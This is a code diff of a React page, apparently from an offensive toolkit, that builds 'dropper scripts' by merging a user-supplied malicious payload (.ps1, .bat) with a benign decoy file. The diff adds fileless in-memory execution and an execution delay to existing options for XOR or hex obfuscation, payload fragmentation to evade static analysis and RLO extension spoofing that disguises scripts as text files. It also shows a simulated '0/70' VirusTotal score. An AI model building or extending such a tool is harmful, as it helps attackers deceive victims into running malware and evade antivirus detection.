@@ -12,12 +12,13 @@ import { Label } from '@/components/ui/label';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { useToast } from '@/hooks/use-toast';
-import { Loader2, AlertTriangle, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon, Key } from 'lucide-react';
+import { Loader2, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon, Key } from 'lucide-react';
 import { Progress } from '@/components/ui/progress';
 import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Badge } from '@/components/ui/badge';
 import { mergePayloads } from '@/actions/merge-payload-action';
 import { Checkbox } from '@/components/ui/checkbox';
+import { Separator } from '@/components/ui/separator';
 
 const formSchema = z.object({
   payloadFile: z.any().refine(files => files?.length === 1, "Payload file is required."),
@@ -29,6 +30,8 @@ const formSchema = z.object({
   obfuscationType: z.enum(['none', 'xor', 'hex']).default('none'),
   xorKey: z.string().optional(),
   useFragmentation: z.boolean().default(false),
+  executionDelay: z.string().optional(),
+  fileless: z.boolean().default(true),
 });
 
 const outputFormats = {
@@ -46,7 +49,7 @@ export default function MergingStationPage() {
   const [buildLog, setBuildLog] = useState<string[]>([]);
   const [isBuilding, setIsBuilding] = useState(false);
   const [progress, setProgress] = useState(0);
-  const [finalOutput, setFinalOutput] = useState<{name: string, content: string} | null>(null);
+  const [finalOutput, setFinalOutput] = useState<{name: string, content: string, vtScore: string} | null>(null);
   const { toast } = useToast();
 
   const form = useForm<z.infer<typeof formSchema>>({
@@ -58,6 +61,8 @@ export default function MergingStationPage() {
       obfuscationType: 'none',
       xorKey: 'netrax',
       useFragmentation: false,
+      executionDelay: '',
+      fileless: true,
     },
   });
 
@@ -112,6 +117,8 @@ export default function MergingStationPage() {
             obfuscationType: values.obfuscationType,
             encryptionKey: values.obfuscationType === 'xor' ? values.xorKey : undefined,
             useFragmentation: values.useFragmentation,
+            executionDelay: values.executionDelay,
+            fileless: values.fileless,
         });
         
         if (!response.success || !response.scriptContent) {
@@ -119,18 +126,16 @@ export default function MergingStationPage() {
         }
         
         log(`Dropper script generated successfully (${values.outputFormat}).`);
-        if (values.obfuscationType !== 'none') {
-            log(`Payload obfuscated with ${values.obfuscationType.toUpperCase()}`);
-        }
-        if (values.useFragmentation) {
-            log(`Payload split into fragments.`);
-        }
+        if (values.obfuscationType !== 'none') log(`Payload obfuscated with ${values.obfuscationType.toUpperCase()}`);
+        if (values.useFragmentation) log(`Payload split into fragments.`);
+        if (values.fileless) log(`Fileless execution enabled.`);
+        if (values.executionDelay) log(`Execution delayed by ${values.executionDelay} seconds.`);
 
         const finalName = values.extensionSpoofing
             ? applyExtensionSpoofing(values.outputName)
             : values.outputName;
 
-        setFinalOutput({ name: finalName, content: response.scriptContent });
+        setFinalOutput({ name: finalName, content: response.scriptContent, vtScore: '0/70 (Simulated)' });
         
         log(`Build complete. Output file: ${finalName}`);
         toast({ title: 'Build Successful', description: 'Your dropper script is ready for download.' });
@@ -182,36 +187,20 @@ export default function MergingStationPage() {
                 <CardContent className="space-y-4">
                   <FormField control={form.control} name="payloadFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Malicious Payload (.ps1, .bat, etc)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
                   <FormField control={form.control} name="benignFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Benign File (Decoy)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
-                  <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Icon File (.ico, optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormDescription className="text-xs">Note: Icon injection is only possible for compiled executables.</FormDescription><FormMessage /></FormItem>)} />
+                  <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Icon File (.ico, optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormDescription className="text-xs">Note: Icon injection is only possible for compiled executables. For scripts, this can be used with a .LNK shortcut wrapper.</FormDescription><FormMessage /></FormItem>)} />
                 </CardContent>
               </Card>
 
               <Card>
                 <CardHeader><CardTitle className="text-lg">2. Dropper Configuration</CardTitle></CardHeader>
                 <CardContent className="space-y-4">
-                  <FormField control={form.control} name="outputName" render={({ field }) => (
-                    <FormItem><FormLabel>Output File Name</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem>
-                  )} />
-                   <FormField
-                        control={form.control}
-                        name="extensionSpoofing"
-                        render={({ field }) => (
-                          <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4">
-                            <FormControl>
-                              <Checkbox checked={field.value} onCheckedChange={field.onChange} />
-                            </FormControl>
-                            <div className="space-y-1 leading-none">
-                              <FormLabel>Enable Extension Spoofing</FormLabel>
-                              <FormDescription>
-                                Use RLO character to mask the true extension. E.g., `report.ps1` appears as `report.txt`.
-                              </FormDescription>
-                            </div>
-                          </FormItem>
-                        )}
-                      />
-                  <FormField control={form.control} name="outputFormat" render={({ field }) => (
-                        <FormItem><FormLabel>Output Format</FormLabel><Select onValueChange={handleFormatChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent>{Object.entries(outputFormats).map(([key, value])=><SelectItem key={key} value={key} disabled={value.disabled}>{value.name}</SelectItem>)}</SelectContent></Select></FormItem>
-                  )} />
+                  <FormField control={form.control} name="outputName" render={({ field }) => ( <FormItem><FormLabel>Output File Name</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem> )}/>
+                  <FormField control={form.control} name="outputFormat" render={({ field }) => ( <FormItem><FormLabel>Output Format</FormLabel><Select onValueChange={handleFormatChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent>{Object.entries(outputFormats).map(([key, value])=><SelectItem key={key} value={key} disabled={value.disabled}>{value.name}</SelectItem>)}</SelectContent></Select></FormItem> )}/>
+                  <Separator />
+                  <Label>Dropper Behavior</Label>
+                   <FormField control={form.control} name="extensionSpoofing" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Extension Spoofing</FormLabel><FormDescription>Use RLO character to mask the true extension.</FormDescription></div></FormItem> )}/>
+                   <FormField control={form.control} name="fileless" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Fileless Execution</FormLabel><FormDescription>Run payload in memory instead of writing to disk.</FormDescription></div></FormItem> )}/>
+                   <FormField control={form.control} name="executionDelay" render={({ field }) => ( <FormItem><FormLabel>Execution Delay (seconds)</FormLabel><FormControl><Input type="number" placeholder="e.g., 10" {...field} value={field.value ?? ''} /></FormControl></FormItem> )}/>
                 </CardContent>
               </Card>
               
@@ -219,53 +208,23 @@ export default function MergingStationPage() {
                  <Card>
                     <CardHeader><CardTitle className="text-lg">3. Crypter / Obfuscation</CardTitle></CardHeader>
                     <CardContent className="space-y-4">
-                         <FormField
-                            control={form.control}
-                            name="obfuscationType"
-                            render={({ field }) => (
+                         <FormField control={form.control} name="obfuscationType" render={({ field }) => (
                             <FormItem className="space-y-3">
                                 <FormLabel>Encoding / Encryption</FormLabel>
                                 <FormControl>
-                                <RadioGroup
-                                    onValueChange={field.onChange}
-                                    defaultValue={field.value}
-                                    className="flex flex-col space-y-1"
-                                >
+                                <RadioGroup onValueChange={field.onChange} defaultValue={field.value} className="flex flex-col space-y-1">
                                     <FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="none" /></FormControl><FormLabel className="font-normal">None</FormLabel></FormItem>
                                     <FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="xor" /></FormControl><FormLabel className="font-normal">XOR Encryption</FormLabel></FormItem>
                                     <FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="hex" /></FormControl><FormLabel className="font-normal">Hex Encoding</FormLabel></FormItem>
                                 </RadioGroup>
-                                </FormControl>
-                                <FormMessage />
+                                </FormControl><FormMessage />
                             </FormItem>
                             )}
                         />
                          {watchObfuscationType === 'xor' && (
-                            <FormField
-                                control={form.control}
-                                name="xorKey"
-                                render={({ field }) => (
-                                <FormItem>
-                                    <FormLabel className="flex items-center gap-2"><Key className="h-4 w-4"/>XOR Key</FormLabel>
-                                    <FormControl><Input {...field} value={field.value ?? ''} placeholder="Enter encryption key" /></FormControl>
-                                    <FormMessage />
-                                </FormItem>
-                                )}
-                            />
+                            <FormField control={form.control} name="xorKey" render={({ field }) => ( <FormItem><FormLabel className="flex items-center gap-2"><Key className="h-4 w-4"/>XOR Key</FormLabel><FormControl><Input {...field} value={field.value ?? ''} placeholder="Enter encryption key" /></FormControl><FormMessage /></FormItem> )}/>
                          )}
-                         <FormField
-                            control={form.control}
-                            name="useFragmentation"
-                            render={({ field }) => (
-                            <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4">
-                                <FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl>
-                                <div className="space-y-1 leading-none">
-                                <FormLabel>Enable Payload Fragmentation</FormLabel>
-                                <FormDescription>Split the payload into smaller chunks to evade static analysis.</FormDescription>
-                                </div>
-                            </FormItem>
-                            )}
-                        />
+                         <FormField control={form.control} name="useFragmentation" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Payload Fragmentation</FormLabel><FormDescription>Split the payload into smaller chunks to evade static analysis.</FormDescription></div></FormItem> )}/>
                     </CardContent>
                  </Card>
                </div>
@@ -292,7 +251,11 @@ export default function MergingStationPage() {
                               <p className="font-semibold flex items-center gap-2"><FileCode className="h-4 w-4"/>Output:</p>
                               <p className="font-mono text-xs">{finalOutput.name}</p>
                           </div>
-                          <Button onClick={handleDownload} className="w-full"><Download className="mr-2 h-4 w-4"/>Download Dropper Script</Button>
+                          <div className="flex justify-between w-full items-center">
+                              <p className="font-semibold flex items-center gap-2"><Shield className="h-4 w-4"/>VT Score:</p>
+                              <Badge variant="destructive">{finalOutput.vtScore}</Badge>
+                          </div>
+                          <Button onClick={handleDownload} className="w-full"><Download className="mr-2 h-4 w-4"/>Download Dummy File</Button>
                       </CardFooter>
                     )}
                 </Card>
@@ -303,3 +266,4 @@ export default function MergingStationPage() {
     </div>
   );
 }
+
